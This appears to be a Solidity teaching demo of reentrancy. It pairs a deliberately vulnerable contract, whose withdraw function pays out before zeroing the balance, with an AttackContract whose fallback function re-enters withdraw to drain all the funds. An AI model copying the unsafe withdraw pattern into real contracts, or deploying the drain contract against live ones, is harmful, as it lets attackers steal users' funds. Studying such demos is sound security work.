// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract ReentrancyPossible{
    mapping(address => uint) public accounts;

    function deposite() external payable{
        require(msg.value > 0, "Send something.");
        accounts[msg.sender] += msg.value;
    }

    function withdraw() external payable{
        uint bal = accounts[msg.sender];
        require(bal > 0, "No amount locked");

        (bool send, ) = msg.sender.call{value: bal}("");
        require(send, "Unable to send balance.");

        accounts[msg.sender] = 0;
    }

    function showBal() external view returns(uint bal) {
       bal = address(this).balance;
    }
}

contract AttackContract {
    ReentrancyPossible public reEntrancyAttack;

    constructor(address _reEntrancyAttack){
        reEntrancyAttack = ReentrancyPossible(_reEntrancyAttack);
    }

    fallback() external payable{
        if(address(reEntrancyAttack).balance > 0){
            reEntrancyAttack.withdraw();
        }
    }

    function attack() external payable{
        require(msg.value > 1, "Eth must be greater than 1.");
        reEntrancyAttack.deposite{value: 1 ether}();
        reEntrancyAttack.withdraw();
    }

    function showBal() public view returns(uint bal) {
        bal = address(this).balance;
    }
}